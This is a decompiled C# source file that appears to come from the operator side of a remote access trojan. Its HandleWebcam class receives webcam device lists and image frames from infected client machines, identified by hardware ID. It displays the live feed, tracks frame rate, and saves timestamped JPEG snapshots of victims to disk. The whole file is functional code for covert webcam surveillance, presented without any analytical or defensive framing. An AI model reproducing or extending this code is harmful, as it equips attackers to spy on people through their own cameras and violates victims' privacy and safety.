using System;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Windows.Forms;
using Server.Connection;
using Server.Forms;
using Server.Helper;
using Server.MessagePack;

namespace Server.Handle_Packet
{
	// Token: 0x02000075 RID: 117
	internal class HandleWebcam
	{
		// Token: 0x0600030C RID: 780 RVA: 0x000213C4 File Offset: 0x0001F5C4
		public HandleWebcam(MsgPack unpack_msgpack, Clients client)
		{
			string asString = unpack_msgpack.ForcePathObject("Command").AsString;
			if (!(asString == "getWebcams"))
			{
				if (!(asString == "capture"))
				{
					return;
				}
				FormWebcam formWebcam = (FormWebcam)Application.OpenForms["Webcam:" + unpack_msgpack.ForcePathObject("Hwid").AsString];
				try
				{
					if (formWebcam != null)
					{
						using (MemoryStream memoryStream = new MemoryStream(unpack_msgpack.ForcePathObject("Image").GetAsBytes()))
						{
							formWebcam.GetImage = (Image)Image.FromStream(memoryStream).Clone();
							formWebcam.pictureBox1.Image = formWebcam.GetImage;
							formWebcam.FPS++;
							if (formWebcam.sw.ElapsedMilliseconds >= 1000L)
							{
								if (formWebcam.SaveIt)
								{
									if (!Directory.Exists(formWebcam.FullPath))
									{
										Directory.CreateDirectory(formWebcam.FullPath);
									}
									formWebcam.pictureBox1.Image.Save(formWebcam.FullPath + "\\IMG_" + DateTime.Now.ToString("MM-dd-yyyy HH;mm;ss") + ".jpeg", ImageFormat.Jpeg);
								}
								Control control = formWebcam;
								string[] array = new string[10];
								array[0] = "Webcam:";
								array[1] = unpack_msgpack.ForcePathObject("Hwid").AsString;
								array[2] = "    FPS:";
								int num = 3;
								int i = formWebcam.FPS;
								array[num] = i.ToString();
								array[4] = "    Screen:";
								array[5] = formWebcam.GetImage.Width.ToString();
								array[6] = " x ";
								array[7] = formWebcam.GetImage.Height.ToString();
								array[8] = "    Size:";
								array[9] = Methods.BytesToString(memoryStream.Length);
								control.Text = string.Concat(array);
								formWebcam.FPS = 0;
								formWebcam.sw = Stopwatch.StartNew();
							}
							goto IL_201;
						}
					}
					client.Disconnected();
					IL_201:
					return;
				}
				catch
				{
					return;
				}
			}
			FormWebcam formWebcam2 = (FormWebcam)Application.OpenForms["Webcam:" + unpack_msgpack.ForcePathObject("Hwid").AsString];
			try
			{
				if (formWebcam2 != null)
				{
					formWebcam2.Client = client;
					formWebcam2.timer1.Start();
					foreach (string text in unpack_msgpack.ForcePathObject("List").AsString.Split(new string[]
					{
						"-=>"
					}, StringSplitOptions.None))
					{
						if (!string.IsNullOrWhiteSpace(text))
						{
							formWebcam2.comboBox1.Items.Add(text);
						}
					}
					formWebcam2.comboBox1.SelectedIndex = 0;
					if (formWebcam2.comboBox1.Text == "None")
					{
						client.Disconnected();
					}
					else
					{
						formWebcam2.comboBox1.Enabled = true;
						formWebcam2.button1.Enabled = true;
						formWebcam2.btnSave.Enabled = true;
						formWebcam2.numericUpDown1.Enabled = true;
						formWebcam2.labelWait.Visible = false;
						formWebcam2.button1.PerformClick();
					}
				}
				else
				{
					client.Disconnected();
				}
			}
			catch
			{
			}
		}
	}
}
